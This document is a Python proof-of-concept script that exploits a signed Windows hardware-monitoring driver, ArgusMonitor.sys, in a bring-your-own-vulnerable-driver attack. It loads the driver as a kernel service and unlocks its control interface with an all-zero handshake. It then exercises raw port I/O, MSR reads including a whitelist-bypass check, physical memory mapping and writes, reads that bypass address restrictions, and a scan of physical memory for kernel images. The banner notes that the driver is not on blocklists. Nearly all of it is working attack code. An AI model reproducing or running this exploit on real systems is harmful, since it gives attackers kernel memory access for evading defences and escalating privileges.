import ctypes, ctypes.wintypes as wt
import hashlib, os, struct, subprocess, sys, time
from contextlib import contextmanager

INVALID_HANDLE_VALUE  = wt.HANDLE(-1).value
GENERIC_RW            = 0xC0000000
OPEN_EXISTING         = 3
FILE_ATTRIBUTE_NORMAL = 0x80
CREATE_NO_WINDOW      = 0x08000000
FMT_FROM_SYS          = 0x1000 | 0x200

k32 = ctypes.WinDLL("kernel32", use_last_error=True)
k32.CreateFileW.restype     = wt.HANDLE
k32.CreateFileW.argtypes    = [wt.LPCWSTR, wt.DWORD, wt.DWORD, ctypes.c_void_p,
                               wt.DWORD, wt.DWORD, wt.HANDLE]
k32.DeviceIoControl.restype = wt.BOOL
k32.DeviceIoControl.argtypes= [wt.HANDLE, wt.DWORD, ctypes.c_void_p, wt.DWORD,
                               ctypes.c_void_p, wt.DWORD,
                               ctypes.POINTER(wt.DWORD), ctypes.c_void_p]
k32.CloseHandle.restype     = wt.BOOL
k32.CloseHandle.argtypes    = [wt.HANDLE]
k32.FormatMessageW.restype  = wt.DWORD
k32.FormatMessageW.argtypes = [wt.DWORD, ctypes.c_void_p, wt.DWORD, wt.DWORD,
                               wt.LPWSTR, wt.DWORD, ctypes.c_void_p]

SVC_NAME   = "ArgusMonitorCTL"
DEVICE     = r"\\.\ArgusMonitorCTLD"
DRV_NAME   = "ArgusMonitor.sys"
DRV_PATH   = os.path.join(os.path.dirname(os.path.abspath(__file__)), DRV_NAME)
DRV_SHA256 = "df9b2892498c68805fdc0fabb369f8bcf011e784898cb32fdc5d85f6123f1126"

IOCTL_HANDSHAKE       = 0x9c402b74
IOCTL_PORT_IN_DWORD   = 0x9c402e00
IOCTL_PORT_IN_BYTE    = 0x9c403a88
IOCTL_PORT_OUT_DWORD  = 0x9c402490
IOCTL_PORT_OUT_BYTE   = 0x9c40277c
IOCTL_PHYSMEM_MAP     = 0x9c403a54
IOCTL_PHYSMEM_UNMAP   = 0x9c402934
IOCTL_PHYSMEM_RD_DW   = 0x9c4020d8
IOCTL_PHYSMEM_WR_DW   = 0x9c403d3c
IOCTL_PHYSMEM_RD_BYTE = 0x9c402e94
IOCTL_PHYSMEM_WR_BYTE = 0x9c402510
IOCTL_PHYSMEM_SINGLE  = 0x9c402994
IOCTL_PHYSMEM_RMR     = 0x9c403218
IOCTL_MSR_READ_1      = 0x9c4020f4
IOCTL_MSR_WRITE_1     = 0x9c4024e8
IOCTL_PCI_CONFIG      = 0x9c402724

PASS, FAIL, INFO, WARN = "PASS", "FAIL", "INFO", "WARN"


def werr(code):
    buf = ctypes.create_unicode_buffer(512)
    n = k32.FormatMessageW(FMT_FROM_SYS, None, code, 0, buf, 512, None)
    return f"0x{code:08X}" + (f" ({buf.value.strip()})" if n else "")


def is_admin():
    try:    return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except: return False


def sha256_file(p):
    h = hashlib.sha256()
    with open(p, "rb") as f:
        for c in iter(lambda: f.read(1 << 16), b""):
            h.update(c)
    return h.hexdigest()


def add_chk(data, total_len):
    d = data.ljust(total_len - 2, b"\x00")
    s = sum(d) & 0xFFFF
    return d + bytes([s >> 8, s & 0xFF])


def strip_chk(data):
    return data[:-2] if len(data) >= 2 else data


def sc(*args):
    return subprocess.run(("sc",) + args, capture_output=True, text=True,
                          creationflags=CREATE_NO_WINDOW)


def load_driver():
    if not os.path.exists(DRV_PATH):
        return False, f"driver missing: {DRV_PATH}"
    actual = sha256_file(DRV_PATH)
    if actual.lower() != DRV_SHA256.lower():
        return False, f"SHA256 mismatch: got {actual}"
    sc("stop", SVC_NAME); sc("delete", SVC_NAME)
    for _ in range(20):
        if sc("query", SVC_NAME).returncode != 0:
            break
        time.sleep(0.1)
    r = sc("create", SVC_NAME, "type=", "kernel", "start=", "demand",
           "binpath=", os.path.abspath(DRV_PATH))
    if r.returncode != 0 and "1073" not in r.stdout:
        return False, f"sc create: {(r.stdout or r.stderr).strip()}"
    r = sc("start", SVC_NAME)
    if r.returncode == 0 or "1056" in r.stdout:
        return True, "loaded"
    return False, f"sc start: {(r.stdout or r.stderr).strip()}"


def unload_driver():
    sc("stop", SVC_NAME); sc("delete", SVC_NAME)


@contextmanager
def driver_loaded():
    ok, msg = load_driver()
    if not ok:
        raise RuntimeError(f"load failed: {msg}")
    try:
        yield
    finally:
        unload_driver()


class Dev:
    def __init__(self):
        h = INVALID_HANDLE_VALUE
        for _ in range(20):
            h = k32.CreateFileW(DEVICE, GENERIC_RW, 0, None, OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL, None)
            if h != INVALID_HANDLE_VALUE:
                break
            time.sleep(0.1)
        if h == INVALID_HANDLE_VALUE:
            raise OSError(f"open {DEVICE}: {werr(ctypes.get_last_error())}")
        self.h = h

    def close(self):
        if self.h and self.h != INVALID_HANDLE_VALUE:
            k32.CloseHandle(self.h)
            self.h = INVALID_HANDLE_VALUE

    def __enter__(self): return self
    def __exit__(self, *_): self.close()

    def ioctl(self, code, in_buf, out_sz):
        ib = ctypes.create_string_buffer(bytes(in_buf), len(in_buf)) if in_buf else None
        ob = ctypes.create_string_buffer(max(out_sz, 4))
        ret = wt.DWORD(0)
        ok = k32.DeviceIoControl(self.h, code,
                                 ctypes.byref(ib) if ib else None, len(in_buf),
                                 ob, out_sz, ctypes.byref(ret), None)
        return ob.raw[:ret.value] if ok else None

    def handshake(self):
        buf = add_chk(b"\x00" * 0x1FE, 0x200)
        return self.ioctl(IOCTL_HANDSHAKE, buf, 0x210) is not None

    def port_out(self, port, val, sz=1):
        data = struct.pack("<II", port, val if sz == 4 else val & 0xFF)
        buf = add_chk(data, 0x10)
        code = IOCTL_PORT_OUT_DWORD if sz == 4 else IOCTL_PORT_OUT_BYTE
        return self.ioctl(code, buf, 8) is not None

    def port_in(self, port, sz=1):
        data = struct.pack("<I", port)
        buf = add_chk(data, 0x10)
        code = IOCTL_PORT_IN_DWORD if sz == 4 else IOCTL_PORT_IN_BYTE
        r = self.ioctl(code, buf, 8)
        if not r or len(r) < 4:
            return None
        raw = strip_chk(r)
        return raw[0] if sz == 1 else struct.unpack("<I", raw[:4])[0]

    def pci_read32(self, bus, dev, fn, off):
        data = struct.pack("<IIIIIII", bus, dev, fn, off, 0, 0, 0)
        buf = add_chk(data, 0x30)
        r = self.ioctl(IOCTL_PCI_CONFIG, buf, 0x18)
        if not r or len(r) < 4:
            return None
        raw = strip_chk(r)
        return struct.unpack("<I", raw[:4])[0]

    def pci_read32_pio(self, bus, dev, fn, off):
        addr = 0x80000000 | (bus << 16) | (dev << 11) | (fn << 8) | (off & 0xFC)
        prev = self.port_in(0xCF8, 4)
        self.port_out(0xCF8, addr, 4)
        try:
            return self.port_in(0xCFC, 4)
        finally:
            if prev is not None:
                self.port_out(0xCF8, prev, 4)

    def msr_read(self, idx):
        data = struct.pack("<I", idx)
        buf = add_chk(data, 0x08)
        r = self.ioctl(IOCTL_MSR_READ_1, buf, 0x10)
        if not r or len(r) < 8:
            return None
        raw = strip_chk(r)
        return struct.unpack("<Q", raw[:8])[0]

    def physmem_map(self, slot, phys_addr, size, bus_num=0xFF, force_remap=1):
        data = struct.pack("<IQIII", slot, phys_addr, size, bus_num, force_remap)
        buf = add_chk(data, 0x28)
        r = self.ioctl(IOCTL_PHYSMEM_MAP, buf, 0x20)
        if not r or len(r) < 8:
            return None
        raw = strip_chk(r)
        return struct.unpack("<Q", raw[:8])[0]

    def physmem_unmap(self, slot):
        data = struct.pack("<I", slot)
        buf = add_chk(data, 0x18)
        self.ioctl(IOCTL_PHYSMEM_UNMAP, buf, 0)

    def physmem_read_dw(self, slot, offset):
        data = struct.pack("<II", slot, offset)
        buf = add_chk(data, 0x18)
        r = self.ioctl(IOCTL_PHYSMEM_RD_DW, buf, 0x18)
        if not r or len(r) < 4:
            return None
        raw = strip_chk(r)
        return struct.unpack("<I", raw[:4])[0]

    def physmem_write_dw(self, slot, offset, value):
        data = struct.pack("<III", slot, offset, value)
        buf = add_chk(data, 0x20)
        return self.ioctl(IOCTL_PHYSMEM_WR_DW, buf, 0) is not None

    def physmem_read_byte(self, slot, offset):
        data = struct.pack("<II", slot, offset)
        buf = add_chk(data, 0x18)
        r = self.ioctl(IOCTL_PHYSMEM_RD_BYTE, buf, 0x18)
        if not r or len(r) < 1:
            return None
        raw = strip_chk(r)
        return raw[0]

    def physmem_write_byte(self, slot, offset, value):
        data = struct.pack("<IIQ", slot, offset, value & 0xFF)
        buf = add_chk(data, 0x20)
        return self.ioctl(IOCTL_PHYSMEM_WR_BYTE, buf, 0) is not None

    def physmem_single_read(self, phys_addr, bus_num=0xFF, cache_type=0):
        data = struct.pack("<QII", phys_addr, bus_num, cache_type)
        buf = add_chk(data, 0x20)
        r = self.ioctl(IOCTL_PHYSMEM_SINGLE, buf, 0x18)
        if not r or len(r) < 4:
            return None
        raw = strip_chk(r)
        return struct.unpack("<I", raw[:4])[0]


def t_rtc(dev, _s):
    fields = []
    for reg in (0, 2, 4, 7, 8, 9):
        if not dev.port_out(0x70, reg, 1):
            return FAIL, "Port I/O", "port_out(0x70) failed"
        v = dev.port_in(0x71)
        if v is None:
            return FAIL, "Port I/O", f"port_in(0x71) failed on reg 0x{reg:02X}"
        fields.append(v)
    sec, mn, hr, day, mo, yr = fields
    return PASS, "Port I/O", f"RTC 20{yr:02X}-{mo:02X}-{day:02X} {hr:02X}:{mn:02X}:{sec:02X}"


def t_pci_hal(dev, state):
    count, first = 0, None
    for d in range(32):
        r = dev.pci_read32(0, d, 0, 0)
        if r and r not in (0, 0xFFFFFFFF):
            count += 1
            if first is None:
                first = (d, r & 0xFFFF, r >> 16)
    state["pci_hal_count"] = count
    if not first:
        return FAIL, "PCI config", "no devices"
    d, v, di = first
    return PASS, "PCI config", f"{count} devices via HAL; first {v:04X}:{di:04X} @ slot {d}"


def t_pci_pio(dev, state):
    count = 0
    for d in range(32):
        r = dev.pci_read32_pio(0, d, 0, 0)
        if r and r not in (0, 0xFFFFFFFF):
            count += 1
    hal = state.get("pci_hal_count", -1)
    if count == 0:
        return FAIL, "PCI via PIO", "0 devices on 0xCF8/0xCFC"
    match = " (matches HAL)" if count == hal else f" (HAL saw {hal})"
    return PASS, "PCI via PIO", f"{count} devices via 0xCF8/0xCFC{match}"


def t_msr_allowed(dev, _s):
    for name, idx in (("MPERF", 0xE7), ("APERF", 0xE8), ("AMD_PSTATE", 0xC0010069)):
        v = dev.msr_read(idx)
        if v not in (None, 0):
            return PASS, "MSR read", f"{name}=0x{v:X}"
    return FAIL, "MSR read", "no allowed MSR returned data"


def t_msr_blocked(dev, _s):
    v = dev.msr_read(0xC0000082)
    if v in (None, 0):
        return PASS, "MSR block", "IA32_LSTAR blocked by whitelist"
    return WARN, "MSR block", f"IA32_LSTAR readable! 0x{v:016X} (whitelist bypass)"


def t_physmem(dev, state):
    va = dev.physmem_map(0, 0xFEE00000, 0x1000)
    if not va:
        return FAIL, "PhysMem map", f"map failed: {werr(ctypes.get_last_error())}"
    state["va"] = va
    apic_id = dev.physmem_read_dw(0, 0x20)
    apic_ver = dev.physmem_read_dw(0, 0x30)
    if apic_id is None:
        return FAIL, "PhysMem map+read", "mapped but DWORD read failed"
    state["apic_id"] = apic_id
    return PASS, "PhysMem map+read", (
        f"0xFEE00000 -> KVA 0x{va:016X}; APIC_ID=0x{apic_id:08X} APIC_VER=0x{apic_ver:08X}")


def t_physmem_write_dw(dev, state):
    if "apic_id" not in state:
        return INFO, "PhysMem WR DW", "skipped (no mapping)"
    orig = state["apic_id"]
    ok = dev.physmem_write_dw(0, 0x20, orig)
    back = dev.physmem_read_dw(0, 0x20)
    if ok and back == orig:
        return PASS, "PhysMem WR DW", "idempotent writeback confirmed"
    if back is None:
        return FAIL, "PhysMem WR DW", f"write ok={ok}, readback failed"
    return FAIL, "PhysMem WR DW", f"wrote 0x{orig:08X}, read 0x{back:08X}"


def t_physmem_byte_rw(dev, state):
    if "va" not in state:
        return INFO, "PhysMem WR B", "skipped (no mapping)"
    b0 = dev.physmem_read_byte(0, 0x30)
    if b0 is None:
        return FAIL, "PhysMem WR B", "byte read failed"
    dev.physmem_write_byte(0, 0x30, b0)
    b1 = dev.physmem_read_byte(0, 0x30)
    if b1 == b0:
        return PASS, "PhysMem WR B", f"read 0x{b0:02X}, writeback confirmed"
    return FAIL, "PhysMem WR B", f"wrote 0x{b0:02X}, read 0x{b1:02X}"


def t_single_shot(dev, _s):
    a = dev.physmem_single_read(0xFFFF0)
    b = dev.physmem_single_read(0xFFFE0)
    if a is None:
        return FAIL, "Single-shot read", "read failed"
    return PASS, "Single-shot read", (
        f"0xFFFF0=0x{a:08X} 0xFFFE0=0x{b:08X} (address restriction bypassed)")


def t_pe_scan(dev, _s):
    for pa in range(0x100000, 0x2000000, 0x1000):
        dw = dev.physmem_single_read(pa)
        if dw is None or (dw & 0xFFFF) != 0x5A4D:
            continue
        pe_off_dw = dev.physmem_single_read(pa + 0x3C)
        if pe_off_dw is None:
            continue
        pe_off = pe_off_dw & 0xFFFF
        if pe_off >= 0x1000:
            continue
        sig = dev.physmem_single_read(pa + pe_off)
        if sig == 0x00004550:
            return PASS, "PE scan", f"kernel PE at phys 0x{pa:08X} (MZ+PE)"
    return INFO, "PE scan", "no PE in first 32 MB (normal on some configs)"


TESTS = [
    t_rtc,
    t_pci_hal,
    t_pci_pio,
    t_msr_allowed,
    t_msr_blocked,
    t_physmem,
    t_physmem_write_dw,
    t_physmem_byte_rw,
    t_single_shot,
    t_pe_scan,
]


def banner():
    print()
    print("  ArgusMonitor.sys -- BYOVD PoC")
    print("  Argotronic UG (Germany) | EV signed | active cert")
    print("  72 KB | 47 IOCTLs | XOR keypad accepts zeros")
    print("  PoC by NotKyFu")
    print("  " + "=" * 56)


def summary(results):
    print()
    print("  " + "-" * 56)
    passed = sum(1 for v, *_ in results if v == PASS)
    warns  = sum(1 for v, *_ in results if v == WARN)
    fails  = sum(1 for v, *_ in results if v == FAIL)
    print(f"  RESULTS: {passed} PASS, {warns} WARN, {fails} FAIL, {len(results)} total")
    print("  " + "-" * 56)
    print(f"  SHA256    : {DRV_SHA256}")
    print(f"  Signed    : Argotronic UG (EV certificate, active)")
    print(f"  Auth      : XOR keypad (user-chosen) + uint16 checksum")
    print(f"  LOLDrivers: NO  |  HVCI blocked: NO  |  CVE: NONE")
    print(f"  PoC by NotKyFu")
    print("  " + "=" * 56)


def run_tests(dev):
    state, results = {}, []
    for fn in TESTS:
        try:
            r = fn(dev, state)
        except Exception as e:
            r = (FAIL, fn.__name__, f"exception: {e}")
        results.append(r)
        print(f"  [{r[0]}] {r[1]:<20} {r[2]}")
    if "va" in state:
        dev.physmem_unmap(0)
    return results


def main():
    banner()
    if not is_admin():
        print("  [-] must run elevated (loading a kernel driver requires SeLoadDriverPrivilege)")
        return 2
    try:
        with driver_loaded():
            with Dev() as dev:
                if not dev.handshake():
                    print(f"  [-] handshake failed: {werr(ctypes.get_last_error())}")
                    return 1
                print("  [+] HANDSHAKE     zero keypad accepted, all IOCTLs unlocked\n")
                results = run_tests(dev)
    except Exception as e:
        print(f"  [-] {e}")
        return 1
    summary(results)
    return 0 if all(v != FAIL for v, *_ in results) else 1


if __name__ == "__main__":
    sys.exit(main())
